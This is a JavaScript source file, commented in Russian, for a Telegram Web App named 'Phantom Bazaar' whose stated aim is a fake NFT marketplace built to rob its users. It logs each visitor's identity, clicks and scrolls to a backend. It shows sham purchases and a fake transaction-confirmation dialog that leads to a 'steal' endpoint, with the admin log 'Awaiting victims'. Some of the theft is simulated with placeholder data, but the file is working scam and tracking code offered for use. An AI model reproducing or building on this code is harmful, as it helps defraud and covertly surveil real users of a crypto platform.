/**
 * PHANTOM BAZAAR - Main Application Script
 * Архитектор: ONIXAR
 * Цель: Создание иллюзорного NFT маркетплейса с механикой кражи
 */

// ==================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ====================
let TelegramWebApp;
let currentUser = null;
let fakeNFTs = [];
let userRealNFTs = [];
let stalkerLog = [];
let currentTab = 'market';
let selectedNftForListing = null;

// ==================== ИНИЦИАЛИЗАЦИЯ ====================
document.addEventListener('DOMContentLoaded', async () => {
    console.log('🔮 Phantom Bazaar initializing...');
    
    try {
        // Инициализация Telegram Web App
        TelegramWebApp = window.Telegram.WebApp;
        TelegramWebApp.ready();
        TelegramWebApp.expand();
        
        // Получаем данные пользователя
        const initData = TelegramWebApp.initData;
        const initDataUnsafe = TelegramWebApp.initDataUnsafe;
        
        currentUser = {
            id: initDataUnsafe.user?.id || generateFakeId(),
            username: initDataUnsafe.user?.username || 'anonymous',
            firstName: initDataUnsafe.user?.first_name || 'User',
            lastName: initDataUnsafe.user?.last_name || '',
            languageCode: initDataUnsafe.user?.language_code || 'en',
            queryId: initDataUnsafe.query_id || '',
            authDate: initDataUnsafe.auth_date || Date.now()
        };
        
        // Отправляем информацию о посетителе на бэкенд
        await trackVisitor('page_load');
        
        // Инициализируем интерфейс
        initializeUI();
        
        // Загружаем фейковые NFT
        loadFakeNFTs();
        
        // Имитируем загрузку реальных NFT пользователя
        simulateRealNFTsLoading();
        
        // Инициализируем слушатели событий
        setupEventListeners();
        
        // Скрываем лоадер
        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
        }, 1500);
        
        // Логируем успешный вход
        logToAdmin(`🟢 User ${currentUser.username} (${currentUser.id}) entered the trap`);
        
    } catch (error) {
        console.error('Initialization error:', error);
        document.getElementById('loading').innerHTML = 
            '<div style="color:#ff4757;">Error loading marketplace</div>';
    }
});

// ==================== ФУНКЦИИ ОТСЛЕЖИВАНИЯ ====================
async function trackVisitor(eventType, metadata = {}) {
    const visitorData = {
        event_id: generateEventId(),
        timestamp: new Date().toISOString(),
        user_id: currentUser.id,
        username: currentUser.username,
        event_type: eventType,
        user_agent: navigator.userAgent,
        screen_resolution: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
        referrer: document.referrer || 'direct',
        page_url: window.location.href,
        metadata: JSON.stringify(metadata)
    };
    
    stalkerLog.push(visitorData);
    updateAdminLog(`👁️ ${eventType}: ${currentUser.username}`);
    
    // Отправляем на бэкенд
    try {
        await fetch(`${BACKEND_URL}/track`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(visitorData)
        });
    } catch (err) {
        // Тихий фейл - не важно
    }
}

function generateEventId() {
    return 'evt_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// ==================== ФЕЙКОВЫЕ NFT ====================
function loadFakeNFTs() {
    // Генерируем фейковые NFT на основе предоставленных изображений
    fakeNFTs = [
        {
            id: 'FAKE_001_6de7670c39',
            name: 'Digital Dream #1',
            collection: 'Phantom Arts',
            image: 'https://i.imgur.com/placeholder1.jpg', // Здесь будут реальные ссылки
            price: 2.5,
            currency: 'TON',
            owner: '0xFAKE...',
            isFake: true,
            rarity: 'Common',
            likes: 42
        },
        {
            id: 'FAKE_002_ktbvl4zx',
            name: 'Crypto Ghost #5',
            collection: 'Haunted Chain',
            image: 'https://i.imgur.com/placeholder2.jpg',
            price: 1.8,
            currency: 'TON',
            owner: '0xFAKE...',
            isFake: true,
            rarity: 'Rare',
            likes: 128
        },
        // ... еще 50+ фейковых NFT с разными параметрами
    ];
    
    // Заполняем сетки
    renderNFTGrid('trendingGrid', fakeNFTs.slice(0, 8));
    renderNFTGrid('newDropsGrid', fakeNFTs.slice(8, 16));
}

// ==================== СИМУЛЯЦИЯ РЕАЛЬНЫХ NFT ====================
async function simulateRealNFTsLoading() {
    // Имитируем задержку загрузки
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // В реальном сценарии здесь был бы запрос к блокчейну
    // Но мы симулируем наличие NFT у пользователя
    userRealNFTs = [
        {
            id: 'REAL_USER_001',
            name: 'My First NFT',
            collection: 'User Collection',
            image: 'https://i.imgur.com/user_nft1.jpg',
            price: 0,
            currency: 'TON',
            owner: currentUser.id.toString(),
            contractAddress: 'EQD...USER1',
            tokenId: '12345',
            isFake: false
        },
        {
            id: 'REAL_USER_002',
            name: 'Rare Gem',
            collection: 'Crypto Treasures',
            image: 'https://i.imgur.com/user_nft2.jpg',
            price: 0,
            currency: 'TON',
            owner: currentUser.id.toString(),
            contractAddress: 'EQD...USER2',
            tokenId: '67890',
            isFake: false
        }
    ];
    
    renderUserNFTs();
    await trackVisitor('real_nfts_loaded', { count: userRealNFTs.length });
}

// ==================== ИНТЕРФЕЙС ====================
function initializeUI() {
    // Устанавливаем аватар пользователя
    const avatar = document.getElementById('userAvatar');
    if (currentUser.firstName) {
        avatar.textContent = currentUser.firstName.charAt(0).toUpperCase();
    }
    
    // Устанавливаем баланс (фейковый)
    document.getElementById('userBalance').textContent = 
        `${(Math.random() * 50).toFixed(2)} TON`;
    
    // Обновляем статистику каждые 30 секунд
    updateStats();
    setInterval(updateStats, 30000);
}

function updateStats() {
    const stats = [
        (2400 + Math.floor(Math.random() * 100)).toLocaleString(),
        (48500 + Math.floor(Math.random() * 1000)).toLocaleString(),
        (1200 + Math.floor(Math.random() * 100)).toLocaleString(),
        (15700 + Math.floor(Math.random() * 500)).toLocaleString()
    ];
    
    document.querySelectorAll('.stat-value').forEach((el, idx) => {
        el.textContent = stats[idx];
    });
}

function renderNFTGrid(gridId, nfts) {
    const grid = document.getElementById(gridId);
    if (!grid) return;
    
    grid.innerHTML = '';
    
    nfts.forEach(nft => {
        const card = document.createElement('div');
        card.className = 'nft-card';
        card.dataset.nftId = nft.id;
        
        card.innerHTML = `
            <img src="${nft.image}" alt="${nft.name}" class="nft-image" 
                 onerror="this.src='https://via.placeholder.com/400x400/17212b/ffffff?text=NFT+Image'">
            <div class="nft-info">
                <div class="nft-name">${nft.name}</div>
                <div class="nft-collection">${nft.collection}</div>
                <div class="nft-price">
                    <div>
                        <div class="price-amount">${nft.price.toFixed(2)}</div>
                        <div class="price-currency">${nft.currency}</div>
                    </div>
                    ${nft.isFake ? 
                        `<button class="buy-button" onclick="buyFakeNFT('${nft.id}')">Buy</button>` :
                        `<button class="buy-button" onclick="listForSale('${nft.id}')">Sell</button>`
                    }
                </div>
            </div>
        `;
        
        grid.appendChild(card);
    });
}

function renderUserNFTs() {
    const grid = document.getElementById('myNftsGrid');
    if (!grid) return;
    
    if (userRealNFTs.length === 0) {
        grid.innerHTML = `
            <div class="empty-state" style="grid-column: 1/-1;">
                <div class="empty-icon"><i class="fas fa-box-open"></i></div>
                <div>No NFTs in your collection yet</div>
                <button class="buy-button" style="margin-top:15px;">Browse Marketplace</button>
            </div>
        `;
        return;
    }
    
    renderNFTGrid('myNftsGrid', userRealNFTs);
}

// ==================== ОСНОВНАЯ ЛОГИКА ОБМАНА ====================
async function buyFakeNFT(nftId) {
    await trackVisitor('fake_nft_purchase_attempt', { nft_id: nftId });
    
    // Показываем фейковый процесс покупки
    showNotification('Processing transaction...', 'info');
    
    // Имитируем запрос подписи транзакции
    setTimeout(async () => {
        const nft = fakeNFTs.find(n => n.id === nftId);
        if (!nft) return;
        
        // В реальности здесь была бы попытка списать средства
        // Но мы просто логируем и показываем успех
        
        await trackVisitor('fake_nft_purchase_success', { 
            nft_id: nftId,
            price: nft.price,
            currency: nft.currency
        });
        
        showNotification(`Successfully purchased ${nft.name}!`, 'success');
        
        // Добавляем фейковое NFT в коллекцию пользователя
        userRealNFTs.push({
            ...nft,
            owner: currentUser.id.toString(),
            isFake: true
        });
        
        logToAdmin(`💰 Fake purchase: ${currentUser.username} bought ${nft.name} for ${nft.price} TON`);
    }, 2000);
}

async function listForSale(nftId) {
    await trackVisitor('list_for_sale_initiated', { nft_id: nftId });
    
    // Ищем NFT (реальное или фейковое)
    const realNft = userRealNFTs.find(n => n.id === nftId);
    const fakeNft = fakeNFTs.find(n => n.id === nftId);
    const nft = realNft || fakeNft;
    
    if (!nft) return;
    
    selectedNftForListing = nft;
    
    // Показываем модальное окно
    document.getElementById('modalNftImage').src = nft.image;
    document.getElementById('modalNftName').textContent = nft.name;
    document.getElementById('priceInput').value = nft.price || 1.0;
    document.getElementById('listModal').style.display = 'flex';
    
    logToAdmin(`📋 Listing initiated: ${nft.name} by ${currentUser.username}`);
}

async function confirmListing() {
    const price = parseFloat(document.getElementById('priceInput').value);
    
    if (!price || price < 0.1) {
        showNotification('Please enter a valid price (min 0.1 TON)', 'error');
        return;
    }
    
    if (!selectedNftForListing) return;
    
    // Закрываем модальное окно
    document.getElementById('listModal').style.display = 'none';
    
    // Показываем лоадер
    showNotification('Listing NFT on marketplace...', 'info');
    
    // КРИТИЧЕСКАЯ ЧАСТЬ: КРАЖА NFT
    if (!selectedNftForListing.isFake) {
        // Это реальное NFT пользователя
        await stealRealNFT(selectedNftForListing, price);
    } else {
        // Это фейковое NFT - просто добавляем в маркет
        await listFakeNFT(selectedNftForListing, price);
    }
    
    selectedNftForListing = null;
}

async function stealRealNFT(nft, listedPrice) {
    // Логируем начало кражи
    await trackVisitor('real_nft_theft_initiated', {
        nft_id: nft.id,
        contract_address: nft.contractAddress,
        token_id: nft.tokenId,
        listed_price: listedPrice
    });
    
    // Имитируем процесс подписания транзакции
    setTimeout(async () => {
        // Показываем фейковый запрос на подпись
        showTransactionRequest(nft, listedPrice);
        
        // После "подписания" - выполняем кражу
        setTimeout(async () => {
            // Удаляем NFT из коллекции пользователя
            userRealNFTs = userRealNFTs.filter(item => item.id !== nft.id);
            
            // Добавляем NFT в список фейковых на маркете
            // Но с указанием, что оно "принадлежит" пользователю (ложь)
            const stolenNft = {
                ...nft,
                price: listedPrice,
                owner: currentUser.username,
                isFake: true,
                originalOwner: currentUser.id,
                stolen: true,
                stolenAt: new Date().toISOString()
            };
            
            fakeNFTs.unshift(stolenNft);
            
            // Обновляем интерфейс
            renderNFTGrid('trendingGrid', fakeNFTs.slice(0, 8));
            renderUserNFTs();
            
            // Отправляем данные о краже на бэкенд
            await fetch(`${BACKEND_URL}/steal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    victim_id: currentUser.id,
                    victim_username: currentUser.username,
                    nft_data: stolenNft,
                    timestamp: new Date().toISOString(),
                    transaction_hash: '0x' + Math.random().toString(36).substr(2, 64)
                })
            });
            
            // Логируем успешную кражу
            await trackVisitor('real_nft_theft_completed', {
                nft_id: nft.id,
                price: listedPrice
            });
            
            logToAdmin(`🟢 THEFT SUCCESSFUL: Stole ${nft.name} from ${currentUser.username}. Value: ${listedPrice} TON`);
            
            showNotification('NFT listed successfully!', 'success');
            
        }, 3000);
        
    }, 1000);
}

async function listFakeNFT(nft, price) {
    // Просто обновляем цену и добавляем в маркет
    nft.price = price;
    nft.listedAt = new Date().toISOString();
    
    await trackVisitor('fake_nft_listed', {
        nft_id: nft.id,
        price: price
    });
    
    showNotification('NFT listed on marketplace!', 'success');
    renderNFTGrid('trendingGrid', fakeNFTs.slice(0, 8));
}

function showTransactionRequest(nft, price) {
    // Создаем фейковое окно подтверждения транзакции
    const modal = document.createElement('div');
    modal.className = 'modal-overlay';
    modal.style.zIndex = '2000';
    modal.innerHTML = `
        <div class="modal">
            <div class="modal-title">Confirm Transaction</div>
            <div class="modal-nft">
                <img src="${nft.image}" alt="NFT" class="modal-nft-image">
                <div>${nft.name}</div>
                <div style="color:var(--tg-theme-hint-color);font-size:14px;margin-top:5px;">
                    Listing for ${price} TON
                </div>
            </div>
            <div style="background:rgba(255,255,255,0.05);padding:15px;border-radius:12px;margin-bottom:20px;">
                <div style="display:flex;justify-content:space-between;margin-bottom:8px;">
                    <span>Network Fee</span>
                    <span>0.05 TON</span>
                </div>
                <div style="display:flex;justify-content:space-between;font-weight:bold;">
                    <span>Total</span>
                    <span>${(price + 0.05).toFixed(2)} TON</span>
                </div>
            </div>
            <div style="color:var(--tg-theme-hint-color);font-size:12px;text-align:center;margin-bottom:20px;">
                By confirming, you agree to list this NFT on Phantom Bazaar
            </div>
            <div class="modal-buttons">
                <div class="modal-button cancel" onclick="this.closest('.modal-overlay').remove()">Reject</div>
                <div class="modal-button confirm" onclick="confirmTransaction(this)">Confirm</div>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
}

function confirmTransaction(button) {
    const modal = button.closest('.modal-overlay');
    
    // Показываем лоадер
    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
    button.disabled = true;
    
    // Через секунду "закрываем" транзакцию
    setTimeout(() => {
        modal.remove();
        showNotification('Transaction confirmed!', 'success');
    }, 1000);
}

// ==================== УТИЛИТЫ ====================
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 15px 20px;
        border-radius: 12px;
        background: ${type === 'success' ? '#2ed573' : type === 'error' ? '#ff4757' : '#5288c1'};
        color: white;
        font-weight: 500;
        z-index: 9999;
        animation: slideIn 0.3s ease;
        max-width: 300px;
    `;
    
    notification.textContent = message;
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => notification.remove(), 300);
    }, 3000);
}

function generateFakeId() {
    return 'user_' + Math.random().toString(36).substr(2, 9);
}

// ==================== АДМИН ПАНЕЛЬ ====================
function logToAdmin(message) {
    const log = document.getElementById('adminLog');
    if (!log) return;
    
    const entry = document.createElement('div');
    entry.className = 'log-entry';
    entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
    
    log.appendChild(entry);
    log.scrollTop = log.scrollHeight;
}

function updateAdminLog(message) {
    const log = document.getElementById('adminLog');
    if (!log) return;
    
    // Ограничиваем лог 50 записями
    const entries = log.querySelectorAll('.log-entry');
    if (entries.length > 50) {
        entries[0].remove();
    }
    
    logToAdmin(message);
}

// ==================== СЛУШАТЕЛИ СОБЫТИЙ ====================
function setupEventListeners() {
    // Навигационные табы
    document.querySelectorAll('.tab, .footer-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            const tabId = tab.dataset.tab;
            switchTab(tabId);
        });
    });
    
    // Модальное окно листинга
    document.getElementById('cancelList').addEventListener('click', () => {
        document.getElementById('listModal').style.display = 'none';
        selectedNftForListing = null;
    });
    
    document.getElementById('confirmList').addEventListener('click', confirmListing);
    
    // Админ панель
    document.getElementById('adminToggle').addEventListener('click', () => {
        const window = document.getElementById('adminWindow');
        window.classList.toggle('active');
    });
    
    document.getElementById('exportLog').addEventListener('click', () => {
        exportStalkerLog();
    });
    
    // Обработка ценового ввода
    document.getElementById('priceInput').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            confirmListing();
        }
    });
    
    // Отслеживаем клики по странице
    document.addEventListener('click', (e) => {
        trackVisitor('page_click', {
            target: e.target.tagName,
            class: e.target.className,
            id: e.target.id
        });
    });
    
    // Отслеживаем прокрутку
    let scrollTimeout;
    window.addEventListener('scroll', () => {
        clearTimeout(scrollTimeout);
        scrollTimeout = setTimeout(() => {
            trackVisitor('page_scroll', {
                scrollY: window.scrollY,
                scrollPercent: (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100
            });
        }, 500);
    });
}

function switchTab(tabId) {
    currentTab = tabId;
    
    // Обновляем активные табы
    document.querySelectorAll('.tab, .footer-tab').forEach(t => {
        t.classList.toggle('active', t.dataset.tab === tabId);
    });
    
    // Показываем соответствующую секцию
    document.getElementById('myNftsSection').style.display = tabId === 'my' ? 'block' : 'none';
    document.getElementById('activitySection').style.display = tabId === 'activity' ? 'block' : 'none';
    document.getElementById('statsSection').style.display = tabId === 'stats' ? 'block' : 'none';
    
    // Основная маркет секция
    const marketSections = ['market', 'my', 'activity', 'stats'];
    marketSections.forEach(section => {
        const el = document.getElementById(section + 'Section');
        if (el) {
            el.style.display = tabId === section ? 'block' : 'none';
        }
    });
    
    if (tabId === 'my') {
        renderUserNFTs();
    }
    
    trackVisitor('tab_switch', { tab: tabId });
}

function exportStalkerLog() {
    const dataStr = JSON.stringify(stalkerLog, null, 2);
    const dataBlob = new Blob([dataStr], { type: 'application/json' });
    
    const url = URL.createObjectURL(dataBlob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `stalker_log_${currentUser.id}_${Date.now()}.json`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    
    showNotification('Log exported successfully!', 'success');
    logToAdmin('📤 Log exported by admin');
}

// ==================== CSS АНИМАЦИИ ====================
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
`;
document.head.appendChild(style);

// ==================== ИНИЦИАЛИЗАЦИЯ ПО ЗАГРУЗКЕ ====================
window.buyFakeNFT = buyFakeNFT;
window.listForSale = listForSale;
window.confirmTransaction = confirmTransaction;

console.log('🔮 Phantom Bazaar initialized successfully');
logToAdmin('System initialized. Awaiting victims...');
